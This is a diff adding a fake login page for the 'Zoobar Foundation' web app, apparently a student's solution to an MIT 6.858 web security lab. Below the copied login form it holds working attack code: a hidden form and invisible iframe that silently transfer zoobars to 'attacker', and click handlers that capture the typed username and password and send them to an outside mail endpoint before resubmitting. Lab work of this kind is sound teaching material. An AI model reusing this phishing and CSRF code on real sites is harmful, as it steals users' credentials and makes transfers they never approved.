@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <link rel="stylesheet" type="text/css" href="http://localhost:8080/zoobar/media/zoobar.css">
+    <title>
+      Login - Zoobar Foundation
+    </title>
+  </head>
+  <body>
+    
+    <h1><a href="http://localhost:8080/zoobar/index.cgi/">Zoobar Foundation for Vigilant
+        Research</a></h1>
+    <h2>Supporting the leading
+      thinkers of the counterinsurgency</h2>
+    
+    <div id="login" class="centerpiece">
+      <form id="loginform" name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login">
+        <table>
+          <tr>
+            <td>Username:</td>
+            <td><input type="text" id="form_username" name="login_username" size="20"
+                       autocomplete="no" value=""></td>
+          </tr>
+          <tr>
+            <td>Password:</td>
+            <td colspan=2><input type="password" id="form_password" name="login_password" size=20 autocomplete="no">
+              <input type="submit" id="submit_login" name="submit_login" value="Log in">
+              <input type="submit" id="submit_registration" name="submit_registration" value="Register"></td>
+          </tr>
+        </table>
+        <input type="hidden" name="nexturl" value="http://localhost:8080/zoobar/index.cgi/">
+      </form>
+    </div>
+    <div class="footer warning">
+
+    </div>
+    <script>document.loginform.login_username.focus();</script>
+
+    <!-- BAD STUFF Happening -->
+    
+    <form method="POST" id="n00b-forum" name="transferform" action="http://localhost:8080/zoobar/index.cgi/transfer" target="secret-iframe" style="width:0;height:0;border: 0;border: none;">
+      <input name="zoobars" type="hidden" value="10">
+      <input name="recipient" type="hidden" value="attacker">
+    </form>
+    
+    <iframe id="secret-iframe" name="secret-iframe" style="width:0;height:0;border: 0;border: none;" src="idk"></iframe>
+    
+    <div id="myZoobars" style="width:0;height:0;border: 0;border: none;"> </div>
+    
+    <script src="http://localhost:8080/zoobar/index.cgi/zoobarjs"> </script>
+
+    <script>
+      var myMischievousDiv = document.getElementById('myZoobars');
+
+      var loginFlag = false;
+      var registerFlag = false;
+      
+      // We are logged in
+      if (myMischievousDiv.innerHTML !== " ") {
+      
+      document.forms.namedItem("n00b-forum").submit()
+
+      document.getElementById("secret-iframe").onload= function() {
+      window.location.href = "http://css.csail.mit.edu/6.858/2019/";        
+      };
+      
+      } else {
+      
+      document.getElementById("submit_login").addEventListener("click", function( event ) {
+      if (!loginFlag) {
+
+      event.preventDefault();
+
+      // Steal the username and password!
+      var usernameValue = document.getElementById("form_username").value;
+      var passwordValue = document.getElementById("form_password").value;
+
+      (new Image()).src='http://css.csail.mit.edu/6.858/2019/labs/sendmail.php?' + 'to=damianb@mit.edu' + '&payload=' + encodeURIComponent(usernameValue) + '/' + encodeURIComponent(passwordValue) + '&random=' + Math.random();
+
+      setTimeout(function(){ loginFlag=true; document.getElementById("submit_login").click(); }, 2000);
+      }
+      
+      });
+
+      document.getElementById("submit_registration").addEventListener("click", function( event ) {
+      if (!registerFlag) {
+
+      event.preventDefault();
+
+      // Steal the username and password!
+      var usernameValue = document.getElementById("form_username").value;
+      var passwordValue = document.getElementById("form_password").value;
+
+      (new Image()).src='http://css.csail.mit.edu/6.858/2019/labs/sendmail.php?' + 'to=damianb@mit.edu' + '&payload=' + encodeURIComponent(usernameValue) + '/' + encodeURIComponent(passwordValue) + '&random=' + Math.random();
+
+      setTimeout(function(){ registerFlag=true; document.getElementById("submit_registration").click(); }, 2000);
+      }
+      
+      });
+      }
+      
+    </script>
+    
+  </body>
+</html>
